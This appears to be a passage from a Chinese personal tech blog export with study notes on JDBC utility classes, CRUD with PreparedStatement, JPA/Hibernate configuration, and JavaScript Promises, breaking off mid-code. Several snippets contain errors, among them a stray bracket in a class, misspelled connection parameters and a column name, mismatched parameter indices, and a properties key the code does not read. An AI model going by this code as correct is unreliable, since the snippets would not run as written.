<h2 id="2-JDBC工具类"><a href="#2-JDBC工具类" class="headerlink" title="2.JDBC工具类"></a>2.JDBC工具类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JDBC工具类？</span></span><br><span class="line"><span class="comment"> *      一、增删改的通用方法</span></span><br><span class="line"><span class="comment"> *      二、查询的通用方法</span></span><br><span class="line"><span class="comment"> *      三、关闭的通用方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DBUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/qy66?characterEnconding=UTF-8&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">         &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">             e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">/** 增删改的通用方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@paramString</span> sql  要执行的sql</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@paramObject</span>[] obj    对象类型的数组  里面存放着 sql执行的占位符参数</span></span><br><span class="line"><span class="comment">      *               【name，age，id】</span></span><br><span class="line"><span class="comment">     *                【id】</span></span><br><span class="line"><span class="comment">      *               【name，age】</span></span><br><span class="line"><span class="comment">      *         Object... 可变参数</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">executeUpdate</span><span class="params">(String sql,Object... args)</span></span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement ps = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = getConnection();</span><br><span class="line">            ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;args.length;i++)&#123;</span><br><span class="line">                ps.setObject(i+<span class="number">1</span>,args[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> i = ps.executeUpdate();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i&gt;<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//关闭</span></span><br><span class="line">            close(conn,ps,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询的通用方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sql</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Map&lt;String,Object&gt;&gt; executeQuery(String sql,Object... args)&#123; <span class="comment">//可变参数  Object... args</span></span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement ps = <span class="keyword">null</span>;</span><br><span class="line">        ResultSet set = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = DBUtil.getConnection();</span><br><span class="line">            ps = conn.prepareStatement(sql);</span><br><span class="line">            <span class="comment">/* 有可能有参数 */</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;args.length;i++)&#123;</span><br><span class="line">                ps.setObject(i+<span class="number">1</span>,args[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*执行*/</span></span><br><span class="line">            set = ps.executeQuery();</span><br><span class="line">            <span class="comment">/*需要将所有数据都存放到 List中    每一行 用一个 map存放*/</span></span><br><span class="line">            List&lt;Map&lt;String,Object&gt;&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="comment">/*获取本次查询结果集有多少列*/</span></span><br><span class="line">            <span class="keyword">int</span> count = set.getMetaData().getColumnCount();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(set.next())&#123;</span><br><span class="line">                Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();<span class="comment">//一行数据 用一个map 接收</span></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                我们不用在乎数据库表中有几列</span></span><br><span class="line"><span class="comment">                通过  getMetData().getColumnLabel() 获取列</span></span><br><span class="line"><span class="comment">                因为用的map键值对集合  得到了列  就能得到相应的values值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;count;i++)&#123;</span><br><span class="line">                    String name = set.getMetaData().getColumnLabel(i+<span class="number">1</span>);</span><br><span class="line">                    map.put(name,set.getObject(name));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/*将每行的map存放到 List中*/</span></span><br><span class="line">                list.add(map);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            close(conn,ps,set);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 关闭的通用方法</span></span><br><span class="line"><span class="comment">    *       先进后出的原则</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(Connection conn,PreparedStatement st,ResultSet set)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(set!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                set.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(st!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                st.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">】</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-JDBC增删改查功能的实现"><a href="#3-JDBC增删改查功能的实现" class="headerlink" title="3.JDBC增删改查功能的实现"></a>3.JDBC增删改查功能的实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCTest06</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement ps = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//1.驱动注册</span></span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="comment">//2.获取连接</span></span><br><span class="line">            conn = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/bjpowernode?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            <span class="comment">//3.获取预编译的数据库操作对象</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//增</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">            String sql = &quot;insert into dept(deptno,dname,loc) values(?,?,?)&quot;;</span></span><br><span class="line"><span class="comment">            ps = conn.prepareStatement(sql);</span></span><br><span class="line"><span class="comment">            ps.setInt(1,60);</span></span><br><span class="line"><span class="comment">            ps.setString(2,&quot;销售部&quot;);</span></span><br><span class="line"><span class="comment">            ps.setString(3,&quot;上海&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//改</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">            String sql = &quot;update dept set dname = ?, loc = ? where deptnp = ?&quot;;</span></span><br><span class="line"><span class="comment">            ps = conn.prepareStatement(sql);</span></span><br><span class="line"><span class="comment">            ps.setString(2,&quot;研发一部&quot;);</span></span><br><span class="line"><span class="comment">            ps.setString(3,&quot;北京&quot;);</span></span><br><span class="line"><span class="comment">            ps.setInt(1,60);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//删</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">            String sql = &quot;delete from dept where deptno = ?&quot;;</span></span><br><span class="line"><span class="comment">            ps = conn.prepareStatement(sql);</span></span><br><span class="line"><span class="comment">            ps.setInt(1,60);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//4.执行SQL语句</span></span><br><span class="line">            <span class="keyword">int</span> count = ps.executeUpdate();</span><br><span class="line">            System.out.println(count);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="comment">//6.释放资源</span></span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (ps != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    ps.close();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    conn.close();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4-使用配置文件工具类"><a href="#4-使用配置文件工具类" class="headerlink" title="4.使用配置文件工具类"></a>4.使用配置文件工具类</h2><p>需要在文件名为db.properties的文件写入以下信息：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">driverClassName</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/bjpowernode?useUnicode=true&amp;charaterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="attr">user</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
<font color="ff0000">注意：</font>5.0版本和8.0版本之间的变化</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态代码块，在程序编译的时候执行</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建Properties对象</span></span><br><span class="line">            Properties p = <span class="keyword">new</span> Properties();</span><br><span class="line">            <span class="comment">//获取文件输入流</span></span><br><span class="line">            InputStream in = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;db.properties&quot;</span>);</span><br><span class="line">            <span class="comment">//加载输入流</span></span><br><span class="line">            p.load(in);</span><br><span class="line">            <span class="comment">//获取数据库连接驱动名字</span></span><br><span class="line">            driver = p.getProperty(<span class="string">&quot;driverClassName&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">//获取数据库连接地址</span></span><br><span class="line">            url = p.getProperty(<span class="string">&quot;url&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">//获取数据库连接用户名</span></span><br><span class="line">            username = p.getProperty(<span class="string">&quot;username&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">//获取数据库连接密码</span></span><br><span class="line">            password = p.getProperty(<span class="string">&quot;password&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span>(driver != <span class="keyword">null</span> &amp;&amp; url != <span class="keyword">null</span></span><br><span class="line">                    &amp;&amp; username != <span class="keyword">null</span> &amp;&amp; password != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//加载驱动</span></span><br><span class="line">                Class.forName(driver);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Connection连接对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConn</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = DriverManager.getConnection(url,username,password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 关闭连接（Connection连接对象必须在最后关闭）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> conn Connection连接对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> st 编译执行对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> rs 结果集</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(Connection conn, Statement st, ResultSet rs)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(rs != <span class="keyword">null</span>)&#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(st != <span class="keyword">null</span>)&#123;</span><br><span class="line">                st.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="mysql8-0和mysql5-7链接时候的区别"><a href="#mysql8-0和mysql5-7链接时候的区别" class="headerlink" title="mysql8.0和mysql5.7链接时候的区别"></a>mysql8.0和mysql5.7链接时候的区别</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mysql5.7</span></span><br><span class="line">jdbc.river=com.mysql.jdbc.Driver</span><br><span class="line"></span><br><span class="line">jdbc.url=<span class="string">&quot;jdbc:mysql://ip:3306/db?characterEncoding=utf-8&quot;</span></span><br><span class="line"><span class="comment">//mysql8.0</span></span><br><span class="line">jdbc.driver=com.mysql.cj.jdbc.Driver</span><br><span class="line">    </span><br><span class="line">Jdbc.url=<span class="string">&quot;jdbc：mysql：//ip:3306/db?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/11/15/DFcxPK.jpg" alt="DFcxPK.jpg"></p>
]]></content>
      <categories>
        <category>JavaWeb学习</category>
      </categories>
      <tags>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title>JPA框架学习</title>
    <url>/post/9af0416b.html</url>
    <content><![CDATA[<h1 id="1-orm思想"><a href="#1-orm思想" class="headerlink" title="1 orm思想"></a>1 orm思想</h1><p>　　就是相当于操作实体类就是操作数据库表，需要先建立两个映射关系（实体类和表、实体类中的属性和表中字段），实现了orm思想的框架：mybatis、hibernate<span id="more"></span></p>
<h1 id="2-Hibernate框架介绍"><a href="#2-Hibernate框架介绍" class="headerlink" title="2 Hibernate框架介绍"></a>2 Hibernate框架介绍</h1><p>　　Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，他将POJO与数据库表建立映射关系，是一个全自动的ORM框架</p>
<h1 id="3-JPA规范"><a href="#3-JPA规范" class="headerlink" title="3 JPA规范"></a>3 JPA规范</h1><p>　　内部是由接口和抽象类组成</p>
<h1 id="4-代码实战"><a href="#4-代码实战" class="headerlink" title="4 代码实战"></a>4 代码实战</h1><h2 id="4-1-maven依赖"><a href="#4-1-maven依赖" class="headerlink" title="4.1 maven依赖"></a>4.1 maven依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="4-2-XML配置"><a href="#4-2-XML配置" class="headerlink" title="4.2 XML配置"></a>4.2 XML配置</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">persistence</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/persistence&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--需要配置persistence-unit节点</span></span><br><span class="line"><span class="comment">        持久化单元</span></span><br><span class="line"><span class="comment">            name：持久化单元名称</span></span><br><span class="line"><span class="comment">            transaction-type：事务管理方式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">persistence-unit</span> <span class="attr">name</span>=<span class="string">&quot;myJpa&quot;</span> <span class="attr">transaction-type</span>=<span class="string">&quot;RESOURCE_LOCAL&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--JPA的实现方式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span>&gt;</span>org.hibernate.jpa.HibernatePersistenceProvider<span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--可选配置：配置JPA实现方式的配置信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--数据库信息</span></span><br><span class="line"><span class="comment">                    1.用户名       javax.persistence.jdbc.user</span></span><br><span class="line"><span class="comment">                    2.密码         javax.persistence.jdbc.password</span></span><br><span class="line"><span class="comment">                    3.驱动         javax.persistence.jdbc.driver</span></span><br><span class="line"><span class="comment">                    4.数据库地址   javax.persistence.jdbc.url --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql:///jpa&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--配置JPA实现方（hibernate）的配置信息</span></span><br><span class="line"><span class="comment">                    显示sql   false|true</span></span><br><span class="line"><span class="comment">                    自动创建数据库表    hibernate.hbm2ddl.auto</span></span><br><span class="line"><span class="comment">                        create      此程序运行时创建数据库表（如果有表，删除表在创建）</span></span><br><span class="line"><span class="comment">                        update      程序运行时创建表（有表就不会创建）</span></span><br><span class="line"><span class="comment">                        none        不创建表--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.show_sql&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.hbm2ddl.auto&quot;</span> <span class="attr">value</span>=<span class="string">&quot;create&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">persistence-unit</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">persistence</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="五-JPA注解"><a href="#五-JPA注解" class="headerlink" title="五 JPA注解"></a>五 JPA注解</h1><div class="table-container">
<table>
<thead>
<tr>
<th>注解</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>@Entity</td>
<td>声明类为实体或表</td>
</tr>
<tr>
<td>@Table</td>
<td>声明表名</td>
</tr>
<tr>
<td>@Basic</td>
<td>指定非约束明确的各个字段</td>
</tr>
<tr>
<td>@Embedded</td>
<td></td>
</tr>
<tr>
<td>@GeneratedValue</td>
<td>配置主键生成策略（IDENTITY自增，SEQUENCE序列，TABLE通过数据库表的形式完成自增，AUTO自动选择）</td>
</tr>
<tr>
<td>@Column</td>
<td>配置属性和字段的映射关系</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
</div>
]]></content>
  </entry>
  <entry>
    <title>JavaScript学习</title>
    <url>/post/d3a7443d.html</url>
    <content><![CDATA[<p>　　在学习小程序期间，没有了解JavaScript，回来补充<span id="more"></span></p>
<h1 id="1-异步编程"><a href="#1-异步编程" class="headerlink" title="1.异步编程"></a>1.异步编程</h1><p>　　同步按照代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高，简单来说：一步就是从主线程发射一个子线程来完成任务。</p>
<h2 id="1-1-什么时候用异步编程"><a href="#1-1-什么时候用异步编程" class="headerlink" title="1.1 什么时候用异步编程"></a>1.1 什么时候用异步编程</h2><p>　　通常用子线程来完成一些可能消耗时间足够长以至于被用户察觉的事情，如读取一个大文件或者发出一个网络请求。因为子线程独立于主线程，所以及时出现阻塞也不会影响到主线程的运行。但是子线程有个局限：一旦发射了以后就会与主线程失去同步，我们无法确定它的结束，如果结束之后需要处理一些事情，比如处理来自服务器的信息，我们是无法将它合并到主线程的。所以，JavaScript中的异步操作函数往往通过回调函数来实现异步任务的结果处理。</p>
<h2 id="1-2-回调函数"><a href="#1-2-回调函数" class="headerlink" title="1.2 回调函数"></a>1.2 回调函数</h2><p>　　回调函数就是一个函数，它是在启动一个异步任务时候告诉它：等你完成了这个任务之后要干什么。这样一来主线程几乎不用关心异步任务状态。<a href="https://www.runoob.com/js/js-async.html">详情链接</a></p>
<h1 id="2-JavaSricpt-Promist"><a href="#2-JavaSricpt-Promist" class="headerlink" title="2.JavaSricpt Promist"></a>2.JavaSricpt Promist</h1><p>　　由于 Promise 是 ES6 新增加的，苹果的 Safari 10 和 Windows 的 Edge 14 版本以上浏览器才开始支持 ES6 特性。在微信小程序开发中，请求request我们就可以采用这个函数。</p>
<h2 id="2-1-构造Promise"><a href="#2-1-构造Promise" class="headerlink" title="2.1 构造Promise"></a>2.1 构造Promise</h2><p>现在新建一个Proise对象：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 要做的事情...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>我们之前遇到的异步任务都是一次异步，如果需要多次调用异步函数呢？例如，如果我想分三次输出字符串，第一次间隔 1 秒，第二次间隔 4 秒，第三次间隔 3 秒：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;First&quot;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Second&quot;</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Third&quot;</span>);</span><br><span class="line">        &#125;, <span class="number">3000</span>);</span><br><span class="line">    &#125;, <span class="number">4000</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p>以上代码非常冗杂，可以使用Promise进行优化：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;First&quot;</span>);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span 